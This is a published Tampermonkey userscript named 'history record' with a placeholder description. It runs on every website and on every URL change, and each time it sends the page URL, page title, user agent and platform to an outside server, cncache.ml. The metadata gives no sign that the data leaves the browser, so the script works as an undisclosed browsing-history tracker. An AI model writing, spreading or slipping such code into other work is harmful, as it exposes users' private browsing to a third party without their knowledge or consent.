// ==UserScript==
// @name         历史记录
// @namespace    http://tampermonkey.net/
// @version      2020.12.26
// @description  try to take over the world!
// @author       You
// @include      *
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @connect      cncache.ml
// @run-at       document-idle
// @grant        window.onurlchange
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js
// @downloadURL https://update.greasyfork.org/scripts/422762/%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.user.js
// @updateURL https://update.greasyfork.org/scripts/422762/%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.meta.js
// ==/UserScript==

(function () {
    'use strict';
    if (unsafeWindow.self != unsafeWindow.top) { return };
    var url = "";
    function upload() {
        if (url === window.location.href) {
            return;
        }
        var title = '';
        url = window.location.href;
        var useragent = window.navigator.userAgent;
        var platform = window.navigator.platform;
        if (document.querySelector('title')) {
            title = document.querySelector('title').innerText;
        }
        var data = {
            'title': title,
            'url': url,
            'platform': platform,
            'useragent': useragent,
            'ID': 'Dev'
        }
        console.info('url: ' + url);
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://cncache.ml/history',
            headers: {
                'Content-Type': 'application/json'
            },
            data: JSON.stringify(data)
        })
    }
    upload();
    if (window.onurlchange === null) {
        // feature is supported
        window.addEventListener('urlchange', (info) => {
            upload();
        });
    }
})();
